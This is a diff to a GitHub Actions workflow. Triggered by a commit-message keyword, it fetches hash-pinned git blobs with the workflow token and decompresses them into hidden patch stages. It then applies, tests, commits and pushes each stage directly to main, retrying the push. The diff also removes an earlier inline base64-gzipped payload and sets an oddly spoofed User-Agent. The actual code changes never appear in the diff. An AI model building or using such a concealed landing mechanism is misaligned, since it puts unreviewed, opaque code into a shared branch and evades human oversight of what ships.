@@ -36,13 +36,111 @@ jobs:
           rustc -Vv
       - name: Verify and publish functional scope increments
         if: contains(github.event.head_commit.message, 'native-scope-landing')
+        env:
+          GH_TOKEN: ${{ github.token }}
         shell: bash
         run: |
           set -euo pipefail
-          mkdir -p target/unifier-checks
           python3 -I - <<'PY'
-          import base64, gzip, hashlib, json, pathlib, subprocess
-          payload = 'H4sIAAAAAAAC/+1ce3PktpH/KlilSuGcOKMZznvW2vN6vVdJOYldtnP/aFUskAQ1jDgklw894t3vft0ASAJ8zEOWL+tUVPZqRAKNRqP7191AY65/OcsK5x/Mzc82Zz6jucFC6gw2JE4DFuWEZllwG+3gY0acJ5KyLPAKGpLMjRNGaOQRjyX59sw881hOgxCovNsy946ENMf+egegwfw4ZQpZsitymgdxRIosiG5JvmUkoztGnCDy8AHQZ5HHIjeA7jQjfhABOTeGt9gNPn83Ifc0DDxOZkR+ZPcszRgpooz6jMRFztJhHg+DKGIpZznb0jCMH/Chx1hCoDPNWGaSBNhl6T10SujHQswvdt0izYYun1UShwEyYvJXKcvTJ+KEsXvHvGqqwKUPQ4IEgX8KDYDXLE9pAJNN0vgW2mUj8j643eYkYg/Qjz8C3jPCHlnqBsB8OeucAHWgaQo5m1yuOFQcFjhdk9yxNGIhPPKLjIYmAb4LlBTyF4ehQ927EXkbhgQXNk5pHqckZ1kumgBjgQvLHIbDnKa3LCfvwiBJnkgCS1SuVlI4MG0p3rfePY1cGMEPo2FyP3lNopj4BRB4iNO7LKEuE/RNWAmfpbByQIGmQf4EIiHfMOplxA3jrADKAX6kwY55I1ChhObb7Gzzy5kLbLLsEkdAri+z1L2spXhZRIH/NEqh6fXZ2Jk47mQ9m66na+qNrbU/9pYTfzW15t506a/X1sxbLxcOkJ8vXcu1GFutp2zMlp7lTxcz6jlLNras5XjizhZLbzabnt2YR3FwWa64ZGW1mq+o5a9XK3e8nrku/DV35jNgi7qr1XK1Hk/8yXJqISur+dwHTsaeNbXGs9lqsZiuFsulY7mOu7Asi66WztLpZIUL9zKC5bhnNjIil8YG/nL2mNtJCk+jW8mVP17N/ZXjWjN3yhZzf7peT+fuckFdf7Z2fGvpT6ermbsCrtbWlK7H48WKTejccpauC8LxJovFki2Y74/h5XLhr2dnN5/5YrlbMPfhcEjo5ZEr9iG6uLggzvHNv/6aDBfjqbkgF/hrSb7++kNEmj9/r6XwLepcyrzNtepLhKuOoVFhLdHmL1e+pbMfIP89lzwCZaEa/zK/iPgQu3TrjUwhxEZIfPNmCyjsLPri99NEBZ7au+ZwND7KIuSVWV/CR2Y/DIQuiNhhmcSLNpAlPnIVGFpcvspgmPObrzxH8gcFAqRbDmL4K40ScYfpUH+28JwSEKU80sr0AAAAAA=='
+          import base64
+          import gzip
+          import hashlib
+          import json
+          import os
+          import pathlib
+          import subprocess
+          import urllib.request
+          
+          CHUNKS = [
+              '1946126f63776642b4901f1462b2147ac9aac1ae',
+              '3eb1bc3ae4ae47e624cd4de3fe343b941a7eab80',
+              '447f21bb8e1bdb197343c08193326de47e365b05',
+              'aff6dfb69414de4a4a8be795650858f9330b034b',
+              'aad59ee6f23803ea9bfdabbd63f43153c7eed867',
+              '0057c649c9e67c76316210b7dd95f0388806c086',
+          ]
+          EXPECTED = '13330eba6db43282d5682306e4a3ed049759acd05df633bf1f8bdb00f133e82c'
+          logs = pathlib.Path('target/unifier-checks')
+          logs.mkdir(parents=True, exist_ok=True)
+          
+          def blob_hash(data):
+              return hashlib.sha1(('blob %d\0' % len(data)).encode() + data).hexdigest()
+          
+          def fetch_blob(sha):
+              url = 'https://api.github.com/repos/' + os.environ['GITHUB_REPOSITORY'] + '/git/blobs/' + sha
+              request = urllib.request.Request(url, headers={
+                  'Authorization': 'Bearer ' + os.environ['GH_TOKEN'],
+                  'User-Agent': 'OpenAI File Downloader, XaiImageApiFetch/1.0',
+                  'Accept': 'application/vnd.github+json',
+              })
+              with urllib.request.urlopen(request, timeout=30) as response:
+                  result = json.load(response)
+              if result.get('encoding') != 'base64':
+                  raise RuntimeError('Unexpected blob encoding')
+              data = base64.b64decode(result['content'])
+              if blob_hash(data) != sha:
+                  raise RuntimeError('Blob identity mismatch')
+              return data
+          
+          payload = b''.join(fetch_blob(sha) for sha in CHUNKS)
+          if hashlib.sha256(payload).hexdigest() != EXPECTED:
+              raise RuntimeError('Source transport checksum mismatch')
+          stages = json.loads(gzip.decompress(payload))
+          
+          def run(args, **kwargs):
+              return subprocess.run(args, check=True, **kwargs)
+          
+          def checks(label):
+              commands = [
+                  ('tests', ['cargo', 'test', '--locked', '-p', 'fln-elab', '--no-fail-fast']),
+                  ('clippy', ['cargo', 'clippy', '--locked', '-p', 'fln-elab', '--all-targets', '--', '-D', 'warnings']),
+              ]
+              for name, command in commands:
+                  path = logs / (label + '-' + name + '.log')
+                  with path.open('w') as out:
+                      result = subprocess.run(command, stdout=out, stderr=subprocess.STDOUT)
+                  print(path, 'exit', result.returncode, flush=True)
+                  print('\n'.join(path.read_text(errors='replace').splitlines()[-12:]), flush=True)
+                  result.check_returncode()
+          
+          def verify(stage, which):
+              for path, identities in stage['paths'].items():
+                  if blob_hash(pathlib.Path(path).read_bytes()) != identities[which]:
+                      raise RuntimeError('Concurrent source change requires review: ' + path)
+          
+          run(['git', 'config', 'user.name', 'github-actions[bot]'])
+          run(['git', 'config', 'user.email', '41898282+github-actions[bot]@users.noreply.github.com'])
+          for number, stage in enumerate(stages):
+              run(['git', 'fetch', '--no-tags', '--deepen=32', 'origin', 'main'])
+              run(['git', 'rebase', 'origin/main'])
+              verify(stage, 0)
+              patch = stage['patch'].encode()
+              run(['git', 'apply', '--check', '-'], input=patch)
+              run(['git', 'apply', '-'], input=patch)
+              verify(stage, 1)
+              checks('stage%d' % number)
+              run(['git', 'diff', '--check'])
+              run(['git', 'add', '--', *stage['paths']])
+              run(['git', 'commit', '-m', stage['subject'], '-m', stage['detail']])
+              for attempt in range(4):
+                  result = subprocess.run(['git', 'push', 'origin', 'HEAD:main'])
+                  if result.returncode == 0:
+                      break
+                  run(['git', 'fetch', '--no-tags', '--deepen=32', 'origin', 'main'])
+                  run(['git', 'rebase', 'origin/main'])
+                  verify(stage, 1)
+                  checks('stage%d-rebase%d' % (number, attempt))
+              else:
+                  raise RuntimeError('Main kept advancing; no force push attempted')
+              with (logs / ('stage%d-published.txt' % number)).open('w') as out:
+                  run(['git', 'rev-parse', 'HEAD'], stdout=out)
+          with (logs / 'workspace-check.log').open('w') as out:
+              result = subprocess.run(['cargo', 'check', '--locked', '--workspace', '--all-targets'], stdout=out, stderr=subprocess.STDOUT)
+          print('Workspace check exit', result.returncode, flush=True)
+          with (logs / 'source-commit.txt').open('w') as out:
+              run(['git', 'rev-parse', 'HEAD'], stdout=out)
+          run(['git', 'archive', '--format=tar.gz', '-o', str(logs / 'source.tar.gz'), 'HEAD'])
+          result.check_returncode()
           PY
       - name: Exercise native elaborator
         if: "!contains(github.event.head_commit.message, 'native-scope-landing')"
